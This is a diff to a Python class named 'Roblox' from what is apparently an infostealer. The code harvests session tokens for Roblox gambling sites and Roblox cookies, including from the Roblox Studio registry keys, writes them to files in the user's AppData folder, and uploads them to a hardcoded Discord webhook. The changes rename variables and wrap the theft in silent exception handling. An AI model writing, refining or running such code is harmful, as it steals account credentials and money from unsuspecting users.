@@ -231,13 +231,15 @@ class Roblox:
     def __init__(self):
         self.hok = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
         LOCAL = os.getenv('LOCALAPPDATA')
-        self.rxfold3r = os.path.join(LOCAL, "Roblox")
-        if os.path.exists(self.rxfold3r):
-            self.Rblxwild_file=open(self.rxfold3r+"\\Rblxwild_Tokens.txt","w+")
-            self.Rblxroll_file=open(self.rxfold3r+"\\Rblxroll_Tokens.txt","w+")
-            self.Betbux_file=open(self.rxfold3r+"\\Betbux_Tokens.txt","w+")
-            self.Rbxflip_file=open(self.rxfold3r+"\\Rbxflip_Tokens.txt","w+")
-            self.Bloxflip_file=open(self.rxfold3r+"\\Bloxflip_Tokens.txt","w+")
+        #os.mkdir(os.path.join(LOCAL, "Roblox"))
+        self.robloxfolder = os.path.join(LOCAL, "Roblox")
+        if os.path.exists(self.robloxfolder):
+         try:
+            self.Rblxwild_file=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
+            self.Rblxroll_file=open(self.robloxfolder+"\\Rblxroll_Tokens.txt","w+")
+            self.Betbux_file=open(self.robloxfolder+"\\Betbux_Tokens.txt","w+")
+            self.Rbxflip_file=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
+            self.Bloxflip_file=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
             self.bloxflip = 0
             self.cookroblo = 0
             self.rbxflip = 0
@@ -335,6 +337,7 @@ class Roblox:
             self.Rbxflip_file.close()
             self.Bloxflip_file.close()
             self.upload()
+         except:pass
         else:pass
 
     def Rblxroll(self,pvth):
@@ -439,7 +442,7 @@ class Roblox:
 
     def RobloxStudio(self):
         try:
-            filo=open(self.rxfold3r+"\\Roblox_Cookies.txt","w+")
+            filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
         except:pass
         try:
             robloxstudiopath = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
